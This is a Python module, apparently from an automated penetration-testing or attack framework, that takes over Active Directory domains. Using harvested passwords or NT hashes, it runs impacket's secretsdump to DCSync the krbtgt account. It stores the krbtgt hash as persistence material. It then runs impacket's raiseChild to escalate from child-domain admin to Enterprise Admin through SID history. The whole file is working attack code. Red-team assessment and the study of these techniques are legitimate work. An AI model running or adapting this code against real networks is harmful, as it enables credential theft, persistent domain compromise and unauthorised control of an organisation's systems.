"""Domain dominance: DCSync (NTDS dump) and cross-trust escalation."""
from __future__ import annotations

import re
from pathlib import Path

from .base import BaseModule


class DomainAdminModule(BaseModule):
    name = "domain_admin"
    description = "DCSync the domain and escalate across trusts"

    def run(self, workdir: Path) -> dict:
        # Confirm/achieve DA via DCSync
        self._dcsync_dump(workdir)
        # Cross-trust escalation (child -> parent)
        self._child_parent_escalation(workdir)
        return {"domain_admin": self.state.domain_admin_achieved,
                "enterprise_admin": self.state.enterprise_admin_achieved}

    def _dc(self) -> str | None:
        return (self.state.domain_controllers or [None])[0]

    def _dcsync_dump(self, workdir: Path) -> None:
        dc = self._dc()
        if not dc:
            return
        for cred in self.state.usable_credentials():
            domain = cred.domain or self.state.domain
            cmd = self.runner.resolve("secretsdump", prefix="impacket-")
            if cred.nthash:
                args = [cmd, f"{domain}/{cred.username}@{dc}",
                        "-hashes", f"0x0:{cred.nthash}", "-just-dc-user", "krbtgt"]
            elif cred.password:
                args = [cmd, f"{domain}/{cred.username}:{cred.password}@{dc}",
                        "-just-dc-user", "krbtgt"]
            else:
                continue
            res = self.runner.run(args, timeout=300, silent=True)
            if "krbtgt" in res.stdout and ":" in res.stdout:
                self.state.domain_admin_achieved = True
                self.log.ok("domain admin confirmed via DCSync (%s)", cred.username)
                self.log_finding(
                    "critical", "Domain Admin achieved",
                    f"{domain}\\{cred.username} can DCSync",
                    technique="DCSync")
                # Save krbtgt hash for persistence material
                krb = _extract_krbtgt(res.stdout)
                if krb:
                    self.state.meta["krbtgt_hash"] = krb
                return
        self.log.info("no credential has DCSync rights (yet)")

    def _child_parent_escalation(self, workdir: Path) -> None:
        """If DA in a child domain with a parent trust, elevate to EA via SID history."""
        if self.state.enterprise_admin_achieved:
            return
        # Only makes sense if we're already DA in the current (child) domain
        if not self.state.domain_admin_achieved:
            return
        dc = self._dc()
        if not dc:
            return
        for cred in self.state.usable_credentials():
            domain = cred.domain or self.state.domain
            cmd = self.runner.resolve("raiseChild", prefix="impacket-")
            if cred.password:
                target = f"{domain}/{cred.username}:{cred.password}"
            elif cred.nthash:
                target = f"{domain}/{cred.username}"
            else:
                continue
            args = [cmd, target]
            if cred.nthash:
                args += ["-hashes", f"0x0:{cred.nthash}"]
            self.log.info("attempting child→parent trust escalation (%s)", domain)
            res = self.runner.run(args, timeout=600, silent=True)
            if "Enterprise Admin" in res.stdout or "worked" in res.stdout.lower():
                self.state.enterprise_admin_achieved = True
                self.log.ok("ENTERPRISE ADMIN achieved via SID history!")
                self.log_finding(
                    "critical", "Enterprise Admin achieved (child→parent trust)",
                    res.stdout[:500], technique="Trust Attack (SID History)")
                return


def _extract_krbtgt(text: str) -> str | None:
    m = re.search(r"krbtgt:[^\n:]*:[^\n:]*:([0-9a-fA-F]{32})", text)
    return m.group(1) if m else None
